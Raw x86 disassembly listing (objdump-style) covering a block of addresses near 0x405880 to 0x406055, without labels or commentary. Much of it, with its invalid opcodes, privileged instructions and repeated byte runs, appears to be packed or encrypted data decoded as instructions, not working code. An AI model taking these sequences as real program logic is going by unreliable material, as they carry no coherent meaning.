  40587b:	add    BYTE PTR ds:0x626210,al
  405881:	add    eax,0x43404140
  405886:	inc    eax
  405887:	inc    ecx
  405888:	add    eax,0x10664062
  40588d:	inc    ebx
  40588e:	(bad)  
  40588f:	fnstenv [ecx+0x4d]
  405892:	dec    eax
  405893:	mov    ah,0xcc
  405895:	inc    ecx
  405896:	rol    ecx,0xed
  405899:	adc    edx,DWORD PTR [ebx]
  40589b:	(bad)
  40589f:	xchg   DWORD PTR [ecx+0x7e],eax
  4058a2:	test   BYTE PTR [ebp+0x52],0xc
  4058a6:	cwde   
  4058a7:	mov    dl,al
  4058a9:	mov    bl,0x73
  4058ab:	bound  esi,QWORD PTR [eax+0x4041cc05]
  4058b1:	add    BYTE PTR [eax],al
  4058b3:	add    BYTE PTR [eax+0x40],al
  4058b6:	inc    ebx
  4058b7:	bound  eax,QWORD PTR [eax]
  4058b9:	inc    eax
  4058ba:	inc    eax
  4058bb:	add    eax,0x62434162
  4058c0:	inc    eax
  4058c1:	js     0x4058d3
  4058c3:	inc    ecx
  4058c4:	add    eax,0x5404325
  4058c9:	bound  eax,QWORD PTR [eax+0x40]
  4058cc:	inc    ecx
  4058cd:	inc    ebx
  4058ce:	arpl   WORD PTR [eax+0x26],sp
  4058d1:	push   cs
  4058d2:	pop    esp
  4058d3:	inc    eax
  4058d4:	inc    edx
  4058d5:	mov    edx,0x4064ac44
  4058da:	push   eax
  4058db:	in     eax,0xb2
  4058dd:	and    DWORD PTR [ebx+eax*8],edx
  4058e0:	scas   al,BYTE PTR es:[edi]
  4058e1:	or     DWORD PTR [edi],eax
  4058e3:	les    ebx,FWORD PTR [si-0x5f]
  4058e7:	out    dx,eax
  4058e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e9:	and    DWORD PTR [ebp+0x66],ecx
  4058ec:	dec    edi
  4058ed:	xchg   esp,eax
  4058ee:	push   ebx
  4058ef:	aas    
  4058f0:	cli    
  4058f1:	xor    al,dl
  4058f3:	inc    eax
  4058f4:	inc    eax
  4058f5:	pop    ss
  4058f6:	and    bl,ah
  4058f8:	lods   al,BYTE PTR ds:[esi]
  4058f9:	and    eax,0x436241
  4058fe:	adc    BYTE PTR [eax+0x0],al
  405901:	add    eax,0x62410040
  405906:	inc    eax
  405907:	add    BYTE PTR [ebx-0x34],al
  40590a:	inc    eax
  40590b:	add    eax,0x78434040
  405910:	bound  eax,QWORD PTR [ecx+0x78]
  405913:	add    eax,0x62404043
  405918:	or     eax,0x7b90e510
  40591d:	test   al,0x38
  40591f:	sub    eax,0x4367c540
  405924:	test   al,0xa6
  405926:	inc    ecx
  405927:	sbb    DWORD PTR [edi],ebx
  405929:	fiadd  WORD PTR [ebx+0x3c]
  40592c:	adc    al,BYTE PTR [esi-0xc]
  40592f:	fs enter 0x9110,0xa4
  405934:	inc    ecx
  405935:	bound  ebp,QWORD PTR [eax+0x7]
  405938:	inc    eax
  405939:	stos   BYTE PTR es:[edi],al
  40593a:	sub    esp,DWORD PTR [ebx-0x45]
  40593d:	out    0xae,eax
  40593f:	inc    ecx
  405940:	inc    eax
  405941:	add    eax,0x43436240
  405946:	add    eax,0x62004040
  40594b:	inc    eax
  40594c:	add    BYTE PTR [ecx+0x40],al
  40594f:	inc    ebx
  405950:	test   BYTE PTR ds:0x58054041,ah
  405956:	inc    eax
  405957:	inc    eax
  405958:	bound  eax,QWORD PTR [eax+0x66]
  40595b:	inc    ecx
  40595c:	inc    eax
  40595d:	add    eax,0x3cd0a300
  405962:	inc    ebp
  405963:	mov    esp,0xd7c9342c
  405968:	add    esi,DWORD PTR [esi]
  40596a:	and    eax,esp
  40596c:	adc    BYTE PTR [edx-0x66],dl
  40596f:	loope  0x40597f
  405971:	sbb    ecx,edi
  405973:	dec    edi
  405974:	dec    esp
  405975:	lds    ebp,FWORD PTR [ebx+0x5e0cd00a]
  40597b:	push   esp
  40597c:	add    BYTE PTR [eax],al
  40597e:	inc    ebx
  40597f:	inc    eax
  405980:	bound  eax,QWORD PTR ds:0x25404110
  405986:	add    ah,cl
  405988:	inc    ebx
  405989:	add    eax,0x40402562
  40598e:	add    BYTE PTR [eax+0x40],al
  405991:	inc    ecx
  405992:	inc    ecx
  405993:	add    eax,0x78434025
  405998:	bound  eax,QWORD PTR [eax-0x7c]
  40599b:	inc    eax
  40599c:	inc    ecx
  40599d:	int    0x4f
  40599f:	inc    esp
  4059a0:	das    
  4059a1:	push   ss
  4059a2:	sti    
  4059a3:	cmp    DWORD PTR [edi],esp
  4059a5:	mov    dl,BYTE PTR [edx+0x40209355]
  4059ab:	test   DWORD PTR [ecx+0xf],eax
  4059ae:	vandps ymm2,ymm6,YMMWORD PTR [eax+0x5ad8ec50]
  4059b6:	inc    ecx
  4059b7:	jbe    0x4059fa
  4059b9:	inc    eax
  4059ba:	inc    eax
  4059bb:	inc    ebx
  4059bc:	int3   
  4059bd:	add    BYTE PTR ds:0x56240,al
  4059c3:	inc    ebx
  4059c4:	inc    eax
  4059c5:	inc    eax
  4059c6:	add    BYTE PTR [ecx+0x62],al
  4059c9:	bound  eax,QWORD PTR [eax]
  4059cb:	int3   
  4059cc:	inc    eax
  4059cd:	inc    ebx
  4059ce:	add    eax,0x43624041
  4059d3:	adc    BYTE PTR [ecx+0x5],al
  4059d6:	inc    eax
  4059d7:	cs add eax,0xef4e5277
  4059dd:	cwde   
  4059de:	test   al,0x3
  4059e0:	fs or  al,0x58
  4059e3:	aas    
  4059e4:	rol    BYTE PTR [eax],1
  4059e6:	adc    edi,esp
  4059e8:	adc    cl,bh
  4059ea:	sub    BYTE PTR [eax+0x4c4463b0],0x65
  4059f1:	rol    bl,1
  4059f3:	gs or  eax,0xea2c904d
  4059f9:	aas    
  4059fa:	mov    eax,0xc2dcbd7
  4059ff:	icebp  
  405a00:	push   eax
  405a01:	push   cs
  405a02:	adc    eax,0xcb357962
  405a07:	test   eax,edx
  405a09:	push   ebp
  405a0a:	retf   
  405a0b:	push   edx
  405a0c:	bound  eax,QWORD PTR [ebx+0x40]
  405a0f:	adc    BYTE PTR ds:0x4158cc40,al
  405a15:	inc    ebx
  405a16:	bound  eax,QWORD PTR [ecx+0x40]
  405a19:	add    eax,0x4140
  405a1e:	and    eax,0x40400062
  405a23:	add    eax,0x84404340
  405a28:	int3   
  405a29:	js     0x405a2b
  405a2b:	inc    ecx
  405a2c:	adc    BYTE PTR [edx+0xf],ah
  405a2f:	inc    ecx
  405a30:	jns    0x405a7a
  405a32:	dec    esp
  405a33:	jno    0x405a2c
  405a35:	sbb    eax,0x45c39a34
  405a3a:	bound  ecx,QWORD PTR [edi+0x45]
  405a3d:	xor    al,0x41
  405a3f:	in     al,dx
  405a40:	mov    ah,0xf3
  405a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a43:	rcl    bh,cl
  405a45:	inc    ebp
  405a46:	sub    al,0x2c
  405a48:	add    BYTE PTR [eax+0x41],al
  405a4b:	inc    eax
  405a4c:	inc    ebx
  405a4d:	bound  ax,DWORD PTR ds:0x40434100
  405a54:	add    eax,0x40054062
  405a59:	bound  eax,QWORD PTR [ecx+0x40]
  405a5c:	inc    ebx
  405a5d:	inc    eax
  405a5e:	add    eax,0x25405841
  405a63:	bound  eax,QWORD PTR [eax+0x43]
  405a66:	inc    eax
  405a67:	adc    BYTE PTR [esp+eax*1+0x45c77a0d],al
  405a6e:	pop    eax
  405a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a70:	repz arpl WORD PTR [edx+0x47],sp
  405a74:	fbld   TBYTE PTR [esi+edi*1+0x40554390]
  405a7b:	xchg   ecx,eax
  405a7c:	pop    es
  405a7d:	adc    BYTE PTR [eax+0x4140aca8],ch
  405a83:	inc    ebx
  405a84:	inc    eax
  405a85:	add    eax,0x43406262
  405a8a:	inc    ecx
  405a8b:	adc    BYTE PTR [eax],al
  405a8d:	inc    eax
  405a8e:	add    eax,0x43000562
  405a93:	add    BYTE PTR [ecx+0x40],al
  405a96:	inc    eax
  405a97:	add    eax,0x400062
  405a9c:	inc    ebx
  405a9d:	inc    eax
  405a9e:	js     0x405ae1
  405aa0:	inc    ecx
  405aa1:	bound  eax,QWORD PTR [eax+0x33]
  405aa4:	std    
  405aa5:	inc    edx
  405aa6:	nop
  405aa7:	test   al,0x64
  405aa9:	pop    ecx
  405aaa:	add    eax,0x79d1424c
  405aaf:	adc    DWORD PTR [edi-0x19f208d2],ecx
  405ab5:	dec    esp
  405ab6:	inc    eax
  405ab7:	inc    esp
  405ab8:	bound  esi,QWORD PTR [eax-0x2c208491]
  405abe:	ja     0x405b10
  405ac0:	dec    eax
  405ac1:	mov    esp,DWORD PTR [edx-0x44]
  405ac4:	bound  eax,QWORD PTR [eax+0x5]
  405ac7:	inc    ecx
  405ac8:	add    BYTE PTR [ebx+0x40],al
  405acb:	inc    eax
  405acc:	inc    ecx
  405acd:	inc    eax
  405ace:	inc    eax
  405acf:	bound  eax,QWORD PTR ds:0x5624300
  405ad5:	add    BYTE PTR [eax+0x40],al
  405ad8:	add    BYTE PTR [ecx+0x43],al
  405adb:	add    BYTE PTR [eax+0x41],al
  405ade:	add    eax,0x40436200
  405ae3:	inc    eax
  405ae4:	add    eax,0xc7798362
  405ae9:	or     al,0x4b
  405aeb:	or     eax,0x30754362
  405af0:	sbb    DWORD PTR [ebx+0x2d],eax
  405af3:	bound  ebp,QWORD PTR [ebx+0xbefdef3]
  405af9:	int    0x61
  405afb:	imul   edx,DWORD PTR [ecx+0x79296238],0x5c
  405b02:	mov    edx,0xbb62bf4c
  405b07:	ins    BYTE PTR es:[edi],dx
  405b08:	mov    ds:0x4815e962,eax
  405b0d:	leave  
  405b0e:	pop    ds
  405b0f:	mov    ch,0xb
  405b11:	mov    ds:0x5404136,al
  405b16:	inc    eax
  405b17:	inc    ebx
  405b18:	bound  eax,QWORD PTR [ecx-0x7c]
  405b1b:	add    BYTE PTR ds:0x404043,ah
  405b21:	add    BYTE PTR ds:0x626210,al
  405b27:	add    eax,0x43404140
  405b2c:	inc    eax
  405b2d:	inc    ecx
  405b2e:	add    eax,0x10664062
  405b33:	inc    ebx
  405b34:	(bad)  
  405b35:	retf   
  405b36:	inc    edx
  405b37:	inc    ecx
  405b38:	aas    
  405b39:	ins    DWORD PTR es:[edi],dx
  405b3a:	jg     0x405acd
  405b3c:	retf   
  405b3d:	pop    ss
  405b3e:	inc    esp
  405b3f:	or     cl,0x1b
  405b42:	or     eax,DWORD PTR [ebp+0x11]
  405b45:	xor    al,0x20
  405b47:	ret    
  405b48:	lods   al,BYTE PTR ds:[esi]
  405b49:	jge    0x405bca
  405b4b:	sub    ah,BYTE PTR [esp+ecx*2+0x6dd8bcf1]
  405b52:	inc    esp
  405b53:	cli    
  405b54:	js     0x405b63
  405b56:	test   al,0x5
  405b58:	jmp    0x405b5f
  405b5a:	int3   
  405b5b:	inc    ecx
  405b5c:	inc    eax
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [eax+0x40],al
  405b62:	inc    ebx
  405b63:	bound  eax,QWORD PTR [eax]
  405b65:	inc    eax
  405b66:	inc    eax
  405b67:	add    eax,0x62434162
  405b6c:	inc    eax
  405b6d:	js     0x405b7f
  405b6f:	inc    ecx
  405b70:	add    eax,0x5404325
  405b75:	bound  eax,QWORD PTR [eax+0x40]
  405b78:	inc    ecx
  405b79:	inc    ebx
  405b7a:	sbb    eax,0x7b7bb79f
  405b7f:	inc    edi
  405b80:	retf   
  405b81:	jle    0x405b64
  405b83:	or     eax,0x3eb86215
  405b88:	dec    ecx
  405b89:	push   esi
  405b8a:	outs   dx,BYTE PTR ds:[esi]
  405b8b:	bound  ebx,QWORD PTR ss:[eax]
  405b8e:	or     eax,0x63d7ab61
  405b93:	jp     0x405b4d
  405b95:	adc    bl,cl
  405b97:	aam    0x46
  405b99:	(bad)  
  405b9a:	and    eax,0x436241
  405b9f:	adc    BYTE PTR [eax+0x0],al
  405ba2:	add    eax,0x62410040
  405ba7:	inc    eax
  405ba8:	add    BYTE PTR [ebx-0x34],al
  405bab:	inc    eax
  405bac:	add    eax,0x78434040
  405bb1:	bound  eax,QWORD PTR [ecx+0x78]
  405bb4:	add    eax,0x62404043
  405bb9:	bound  ecx,QWORD PTR [esi]
  405bbb:	test   BYTE PTR [ecx],ah
  405bbd:	pop    ds
  405bbe:	fld    TBYTE PTR [edi+0x1d]
  405bc1:	and    esi,DWORD PTR [ecx+edi*4+0x5a]
  405bc5:	dec    edx
  405bc6:	sub    BYTE PTR [ebx+eiz*8+0x3c5214d3],al
  405bcd:	pop    esp
  405bce:	bound  edi,QWORD PTR [ebx-0x6b]
  405bd1:	inc    ecx
  405bd2:	inc    eax
  405bd3:	add    eax,0x43436240
  405bd8:	add    eax,0x62004040
  405bdd:	inc    eax
  405bde:	add    BYTE PTR [ecx+0x40],al
  405be1:	inc    ebx
  405be2:	test   BYTE PTR ds:0x58054041,ah
  405be8:	inc    eax
  405be9:	inc    eax
  405bea:	bound  eax,QWORD PTR [eax+0x66]
  405bed:	inc    ecx
  405bee:	inc    eax
  405bef:	add    eax,0xd625e500
  405bf4:	test   al,0xc0
  405bf6:	xchg   edx,eax
  405bf7:	or     ecx,DWORD PTR [esi+0x3f]
  405bfa:	jno    0x405bc4
  405bfc:	mov    edi,0xc7cdc595
  405c01:	jp     0x405bb8
  405c03:	ret    
  405c04:	sub    bl,BYTE PTR [edi+edi*4+0x1]
  405c08:	jnp    0x405bed
  405c0a:	inc    ecx
  405c0b:	ds inc eax
  405c0d:	and    DWORD PTR ds:0x71db476c,edx
  405c13:	cmp    eax,0xd9f66b2a
  405c18:	add    BYTE PTR [eax],al
  405c1a:	inc    ebx
  405c1b:	inc    eax
  405c1c:	bound  eax,QWORD PTR ds:0x25404110
  405c22:	add    ah,cl
  405c24:	inc    ebx
  405c25:	add    eax,0x40402562
  405c2a:	add    BYTE PTR [eax+0x40],al
  405c2d:	inc    ecx
  405c2e:	inc    ecx
  405c2f:	add    eax,0x78434025
  405c34:	bound  eax,QWORD PTR [eax-0x7c]
  405c37:	inc    eax
  405c38:	inc    ecx
  405c39:	outs   dx,BYTE PTR ds:[esi]
  405c3a:	in     al,0x4b
  405c3c:	arpl   WORD PTR [edi+0x7b794f50],di
  405c42:	daa    
  405c43:	push   eax
  405c44:	inc    esi
  405c45:	mov    edi,0xaa7c4f65
  405c4a:	push   esp
  405c4b:	push   cs
  405c4c:	sub    BYTE PTR [ecx],cl
  405c4e:	pop    esp
  405c4f:	inc    esp
  405c50:	bound  esi,QWORD PTR [edx]
  405c52:	loope  0x405cd3
  405c54:	rcl    ebp,0x20
  405c57:	inc    ebx
  405c58:	ins    DWORD PTR es:[edi],dx
  405c59:	mov    ebp,DWORD PTR [edi]
  405c5b:	jno    0x405c97
  405c5d:	test   al,0xba
  405c5f:	les    ecx,FWORD PTR [eax-0x57f39a8e]
  405c65:	inc    eax
  405c66:	ret    
  405c67:	and    al,0x63
  405c69:	push   es
  405c6a:	jno    0x405c3d
  405c6c:	adc    al,BYTE PTR [eax+0x17]
  405c6f:	or     BYTE PTR [edx+0x41],al
  405c72:	inc    eax
  405c73:	inc    eax
  405c74:	inc    ebx
  405c75:	int3   
  405c76:	add    BYTE PTR ds:0x56240,al
  405c7c:	inc    ebx
  405c7d:	inc    eax
  405c7e:	inc    eax
  405c7f:	add    BYTE PTR [ecx+0x62],al
  405c82:	bound  eax,QWORD PTR [eax]
  405c84:	int3   
  405c85:	inc    eax
  405c86:	inc    ebx
  405c87:	add    eax,0x43624041
  405c8c:	adc    BYTE PTR [ecx+0x5],al
  405c8f:	inc    eax
  405c90:	test   al,0x25
  405c92:	pop    esp
  405c93:	inc    esp
  405c94:	dec    dx
  405c96:	inc    ebx
  405c97:	call   0x4170a0f6
  405c9c:	sbb    ah,BYTE PTR [edx+esi*1+0x7c]
  405ca0:	test   eax,0xa81414e0
  405ca5:	xor    dl,BYTE PTR [edx+0x62aee850]
  405cab:	inc    ebx
  405cac:	inc    eax
  405cad:	adc    BYTE PTR ds:0x4158cc40,al
  405cb3:	inc    ebx
  405cb4:	bound  eax,QWORD PTR [ecx+0x40]
  405cb7:	add    eax,0x4140
  405cbc:	and    eax,0x40400062
  405cc1:	add    eax,0x84404340
  405cc6:	int3   
  405cc7:	js     0x405cc9
  405cc9:	inc    ecx
  405cca:	adc    BYTE PTR [edx+0xf],ah
  405ccd:	dec    esp
  405cce:	retf   
  405ccf:	pop    eax
  405cd0:	lock jae 0x405c7b
  405cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cd4:	sahf   
  405cd5:	jb     0x405c8b
  405cd7:	dec    edi
  405cd8:	arpl   cx,bx
  405cda:	adc    bh,BYTE PTR [ebx]
  405cdc:	add    eax,0x43eb0d9d
  405ce1:	inc    ecx
  405ce2:	pop    ecx
  405ce3:	test   ecx,esp
  405ce5:	adc    bl,cl
  405ce7:	add    BYTE PTR [eax+0x41],al
  405cea:	inc    eax
  405ceb:	inc    ebx
  405cec:	bound  ax,DWORD PTR ds:0x40434100
  405cf3:	add    eax,0x40054062
  405cf8:	bound  eax,QWORD PTR [ecx+0x40]
  405cfb:	inc    ebx
  405cfc:	inc    eax
  405cfd:	add    eax,0x25405841
  405d02:	bound  eax,QWORD PTR [eax+0x43]
  405d05:	inc    eax
  405d06:	adc    BYTE PTR [esp+edi*1-0x6ca1d8bb],ch
  405d0d:	and    eax,DWORD PTR [eax+0x62]
  405d10:	jle    0x405d13
  405d12:	inc    edx
  405d13:	sbb    ch,BYTE PTR [ebx+0x4484a030]
  405d19:	push   edx
  405d1a:	call   0x8149b0aa
  405d1f:	ret    
  405d20:	cmc    
  405d21:	mov    edi,0x40616267
  405d26:	inc    ecx
  405d27:	inc    ebx
  405d28:	inc    eax
  405d29:	add    eax,0x43406262
  405d2e:	inc    ecx
  405d2f:	adc    BYTE PTR [eax],al
  405d31:	inc    eax
  405d32:	add    eax,0x43000562
  405d37:	add    BYTE PTR [ecx+0x40],al
  405d3a:	inc    eax
  405d3b:	add    eax,0x400062
  405d40:	inc    ebx
  405d41:	inc    eax
  405d42:	js     0x405d85
  405d44:	inc    ecx
  405d45:	bound  eax,QWORD PTR [eax+0x13]
  405d48:	dec    ebx
  405d49:	xor    eax,0x7901501
  405d4e:	pusha  
  405d4f:	pop    edx
  405d50:	xchg   esp,eax
  405d51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d52:	arpl   bp,cx
  405d54:	push   ebp
  405d55:	jg     0x405db0
  405d57:	inc    ecx
  405d58:	push   esp
  405d59:	bound  edx,QWORD PTR [eax]
  405d5b:	imul   ecx,ecx,0x4062fae2
  405d61:	add    eax,0x40430041
  405d66:	inc    eax
  405d67:	inc    ecx
  405d68:	inc    eax
  405d69:	inc    eax
  405d6a:	bound  eax,QWORD PTR ds:0x5624300
  405d70:	add    BYTE PTR [eax+0x40],al
  405d73:	add    BYTE PTR [ecx+0x43],al
  405d76:	add    BYTE PTR [eax+0x41],al
  405d79:	add    eax,0x40436200
  405d7e:	inc    eax
  405d7f:	add    eax,0xa8627f62
  405d84:	jne    0x405dbb
  405d86:	jnp    0x405d59
  405d88:	and    al,0x5
  405d8a:	clc    
  405d8b:	adc    BYTE PTR [ecx],dl
  405d8d:	inc    edx
  405d8e:	hlt    
  405d8f:	push   0x3a
  405d91:	pop    edi
  405d92:	adc    ch,BYTE PTR [ecx]
  405d94:	inc    ecx
  405d95:	inc    eax
  405d96:	add    eax,0x41624340
  405d9b:	test   BYTE PTR [eax],al
  405d9d:	and    eax,0x404043
  405da2:	add    BYTE PTR ds:0x626210,al
  405da8:	add    eax,0x43404140
  405dad:	inc    eax
  405dae:	inc    ecx
  405daf:	add    eax,0x10664062
  405db4:	inc    ebx
  405db5:	bound  esp,QWORD PTR [edx+0x6e]
  405db8:	bound  esp,QWORD PTR [edx-0x9b3fabf]
  405dbe:	cmp    BYTE PTR [eax+0x5fa1069c],cl
  405dc4:	sbb    BYTE PTR [edi-0x78],0x62
  405dc8:	mov    edi,DWORD PTR [edx]
  405dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcb:	mov    bl,0xa8
  405dce:	bound  esp,QWORD PTR [eax+ebp*4]
  405dd1:	mov    eax,ds:0x41cc0554
  405dd6:	inc    eax
  405dd7:	add    BYTE PTR [eax],al
  405dd9:	add    BYTE PTR [eax+0x40],al
  405ddc:	inc    ebx
  405ddd:	bound  eax,QWORD PTR [eax]
  405ddf:	inc    eax
  405de0:	inc    eax
  405de1:	add    eax,0x62434162
  405de6:	inc    eax
  405de7:	js     0x405df9
  405de9:	inc    ecx
  405dea:	add    eax,0x5404325
  405def:	bound  eax,QWORD PTR [eax+0x40]
  405df2:	inc    ecx
  405df3:	inc    ebx
  405df4:	fistp  QWORD PTR [eax+0x12644c12]
  405dfa:	inc    ecx
  405dfb:	and    ebx,DWORD PTR [edi]
  405dfd:	inc    ebx
  405dfe:	pop    esp
  405dff:	sbb    al,0x62
  405e01:	mov    edi,0x4c2569b2
  405e06:	adc    DWORD PTR [ebp-0x1cd7b596],esi
  405e0c:	dec    esi
  405e0d:	jo     0x405dda
  405e0f:	arpl   WORD PTR [eax+0x514c9614],sp
  405e15:	push   edx
  405e16:	lods   al,BYTE PTR ds:[esi]
  405e17:	mul    DWORD PTR [edx-0x33]
  405e1a:	xor    DWORD PTR [edx+0x430d11e3],esp
  405e20:	frstor ds:0x436241
  405e26:	adc    BYTE PTR [eax+0x0],al
  405e29:	add    eax,0x62410040
  405e2e:	inc    eax
  405e2f:	add    BYTE PTR [ebx-0x34],al
  405e32:	inc    eax
  405e33:	add    eax,0x78434040
  405e38:	bound  eax,QWORD PTR [ecx+0x78]
  405e3b:	add    eax,0x62404043
  405e40:	dec    eax
  405e41:	ja     0x405deb
  405e43:	sbb    eax,ebx
  405e45:	retf   
  405e46:	cmp    eax,0x436bcbaf
  405e4b:	inc    eax
  405e4c:	(bad)  
  405e4d:	xchg   esp,eax
  405e4e:	jbe    0x405df8
  405e50:	dec    eax
  405e51:	aas    
  405e52:	pusha  
  405e53:	xor    DWORD PTR [ecx+0x40],eax
  405e56:	add    eax,0x43436240
  405e5b:	add    eax,0x62004040
  405e60:	inc    eax
  405e61:	add    BYTE PTR [ecx+0x40],al
  405e64:	inc    ebx
  405e65:	test   BYTE PTR ds:0x58054041,ah
  405e6b:	inc    eax
  405e6c:	inc    eax
  405e6d:	bound  eax,QWORD PTR [eax+0x66]
  405e70:	inc    ecx
  405e71:	inc    eax
  405e72:	add    eax,0xdab5400
  405e77:	mov    esi,0xc8235a48
  405e7c:	push   esp
  405e7d:	dec    eax
  405e7e:	fsubr  QWORD PTR [edx]
  405e80:	pop    esi
  405e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e82:	gs pop ss
  405e84:	ror    DWORD PTR [edi+0x6a],1
  405e87:	inc    edx
  405e88:	adc    BYTE PTR [edx-0x33c7cd5d],0xc4
  405e8f:	rcl    BYTE PTR [eax],1
  405e91:	add    BYTE PTR [edx],al
  405e93:	add    BYTE PTR [eax],al
  405e95:	inc    ebx
  405e96:	inc    eax
  405e97:	bound  eax,QWORD PTR ds:0x25404110
  405e9d:	add    ah,cl
  405e9f:	inc    ebx
  405ea0:	add    eax,0x40402562
  405ea5:	add    BYTE PTR [eax+0x40],al
  405ea8:	inc    ecx
  405ea9:	inc    ecx
  405eaa:	add    eax,0x78434025
  405eaf:	bound  eax,QWORD PTR [eax-0x7c]
  405eb2:	inc    eax
  405eb3:	inc    ecx
  405eb4:	mov    edi,0x84303e65
  405eb9:	mov    al,0xa6
  405ebb:	stos   BYTE PTR es:[edi],al
  405ebc:	ins    DWORD PTR es:[edi],dx
  405ebd:	dec    esi
  405ebe:	mov    al,0xe8
  405ec0:	bound  eax,QWORD PTR ds:0xccfdab5b
  405ec6:	test   al,0x6d
  405ec8:	sbb    ecx,ebp
  405eca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ecb:	and    esi,DWORD PTR [ebx]
  405ecd:	gs inc eax
  405ecf:	mov    edi,0x45f1120c
  405ed4:	xchg   ecx,eax
  405ed5:	fld    QWORD PTR [eax-0xc]
  405ed8:	bound  edx,QWORD PTR [eax+0x53]
  405edb:	pusha  
  405edc:	inc    ecx
  405edd:	inc    eax
  405ede:	inc    eax
  405edf:	inc    ebx
  405ee0:	int3   
  405ee1:	add    BYTE PTR ds:0x56240,al
  405ee7:	inc    ebx
  405ee8:	inc    eax
  405ee9:	inc    eax
  405eea:	add    BYTE PTR [ecx+0x62],al
  405eed:	bound  eax,QWORD PTR [eax]
  405eef:	int3   
  405ef0:	inc    eax
  405ef1:	inc    ebx
  405ef2:	add    eax,0x43624041
  405ef7:	adc    BYTE PTR [ecx+0x5],al
  405efa:	inc    eax
  405efb:	aas    
  405efc:	test   al,0x53
  405efe:	gs inc ecx
  405f00:	adc    eax,0x784632e3
  405f05:	enter  0xa031,0xcb
  405f09:	sbb    eax,0x282ad248
  405f0e:	aam    0x5
  405f10:	inc    ebp
  405f11:	xchg   BYTE PTR [ecx+0x43624274],ah
  405f17:	inc    eax
  405f18:	adc    BYTE PTR ds:0x4158cc40,al
  405f1e:	inc    ebx
  405f1f:	bound  eax,QWORD PTR [ecx+0x40]
  405f22:	add    eax,0x4140
  405f27:	and    eax,0x40400062
  405f2c:	add    eax,0x84404340
  405f31:	int3   
  405f32:	js     0x405f34
  405f34:	inc    ecx
  405f35:	adc    BYTE PTR [edx+0xf],ah
  405f38:	dec    edi
  405f39:	xchg   BYTE PTR gs:[esi+0x45],dl
  405f3d:	add    eax,0xd7358e40
  405f42:	inc    ecx
  405f43:	mov    esp,0x3051e14a
  405f48:	inc    eax
  405f49:	mov    esp,0x505d246f
  405f4e:	inc    esi
  405f4f:	add    BYTE PTR [eax+0x41],al
  405f52:	inc    eax
  405f53:	inc    ebx
  405f54:	bound  ax,DWORD PTR ds:0x40434100
  405f5b:	add    eax,0x40054062
  405f60:	bound  eax,QWORD PTR [ecx+0x40]
  405f63:	inc    ebx
  405f64:	inc    eax
  405f65:	add    eax,0x25405841
  405f6a:	bound  eax,QWORD PTR [eax+0x43]
  405f6d:	inc    eax
  405f6e:	adc    ch,al
  405f70:	dec    eax
  405f71:	bound  ecx,QWORD PTR [edx+eax*2-0x53]
  405f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f76:	fisttp WORD PTR [edi-0x4e]
  405f79:	mov    al,0x62
  405f7b:	popf   
  405f7c:	or     ecx,DWORD PTR [eax]
  405f7e:	jg     0x405fc5
  405f80:	lock or eax,0xe159699c
  405f86:	icebp  
  405f87:	lods   al,BYTE PTR ds:[esi]
  405f88:	dec    esp
  405f89:	inc    ebx
  405f8a:	jmp    0x405fa6
  405f8c:	fbld   TBYTE PTR [ecx+0xb]
  405f8f:	inc    ecx
  405f90:	inc    ebp
  405f91:	mov    ah,0xc5
  405f93:	push   esi
  405f94:	xchg   dl,ah
  405f96:	mov    bl,0x41
  405f98:	xor    eax,0x40434140
  405f9d:	add    eax,0x43406262
  405fa2:	inc    ecx
  405fa3:	adc    BYTE PTR [eax],al
  405fa5:	inc    eax
  405fa6:	add    eax,0x43000562
  405fab:	add    BYTE PTR [ecx+0x40],al
  405fae:	inc    eax
  405faf:	add    eax,0x400062
  405fb4:	inc    ebx
  405fb5:	inc    eax
  405fb6:	js     0x405ff9
  405fb8:	inc    ecx
  405fb9:	bound  eax,QWORD PTR [eax+0x41]
  405fbc:	dec    esp
  405fbd:	cmp    eax,0xc4001fff
  405fc2:	jle    0x40601b
  405fc4:	cwde   
  405fc5:	dec    ebx
  405fc6:	or     esp,DWORD PTR ds:0x3036a47f
  405fcc:	add    eax,0x61510020
  405fd1:	les    eax,FWORD PTR [edi+0x67]
  405fd4:	xchg   DWORD PTR [ecx-0x2f],ebp
  405fd7:	and    edx,ecx
  405fd9:	dec    edi
  405fda:	retf   0x4118
  405fdd:	shl    BYTE PTR [edx+0x40],cl
  405fe0:	add    eax,0x40430041
  405fe5:	inc    eax
  405fe6:	inc    ecx
  405fe7:	inc    eax
  405fe8:	inc    eax
  405fe9:	bound  eax,QWORD PTR ds:0x5624300
  405fef:	add    BYTE PTR [eax+0x40],al
  405ff2:	add    BYTE PTR [ecx+0x43],al
  405ff5:	add    BYTE PTR [eax+0x41],al
  405ff8:	add    eax,0x40436200
  405ffd:	inc    eax
  405ffe:	add    eax,0xff522b62
  406003:	inc    eax
  406004:	lahf   
  406005:	popa   
  406006:	sbb    eax,0x582646d6
  40600b:	mov    ah,0x28
  40600d:	test   al,0xf8
  40600f:	jbe    0x405fb8
  406011:	adc    BYTE PTR [ecx+0x5404142],dh
  406017:	inc    eax
  406018:	inc    ebx
  406019:	bound  eax,QWORD PTR [ecx-0x7c]
  40601c:	add    BYTE PTR ds:0x404043,ah
  406022:	add    BYTE PTR ds:0x626210,al
  406028:	add    eax,0x43404140
  40602d:	inc    eax
  40602e:	inc    ecx
  40602f:	add    eax,0x10664062
  406034:	inc    ebx
  406035:	bound  ecx,QWORD PTR [edx]
  406037:	adc    ah,BYTE PTR [edx+0x64]
  40603a:	mov    bl,BYTE PTR [eax]
  40603c:	dec    eax
  40603d:	jmp    0x438314ae
  406042:	stos   BYTE PTR es:[edi],al
  406043:	jmp    0x405fd6
  406045:	mov    BYTE PTR [edi+0x42],ah
  406048:	xor    al,0x51
  40604a:	in     al,0x5
  40604c:	int3   
  40604d:	inc    ecx
  40604e:	inc    eax
  40604f:	add    BYTE PTR [eax],al
  406051:	add    BYTE PTR [eax+0x40],al
  406054:	inc    ebx
  406055:	bound  eax,QWORD PTR [eax]
